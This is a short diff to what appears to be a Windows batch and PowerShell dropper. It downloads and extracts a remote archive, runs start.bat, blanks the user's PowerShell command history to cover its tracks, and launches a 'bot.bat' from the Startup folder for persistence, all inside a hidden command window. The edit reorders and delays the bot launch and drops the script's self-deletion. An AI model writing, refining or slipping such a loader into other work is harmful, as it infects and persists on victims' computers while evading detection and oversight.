@@ -11,9 +11,7 @@ powershell -Command "Invoke-WebRequest -Uri '%ql%' -OutFile '%ZipPath%'"
 powershell -Command "Expand-Archive -Path '%ZipPath%' -DestinationPath '%ExtractPath%' -Force"
 del %ZipPath%
 cd %ExtractPath%
-start.bat
 echo. > "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-cd %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup & bot.bat
-del Updater.bats
-exit
+echo Updating & start "" cmd /c "timeout /t 7 >nul & cd /d %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup & echo Now in: %cd% & bot.bat"
+start.bat
 '; Start-Process cmd -ArgumentList '/c', $code -WindowStyle Hidden"
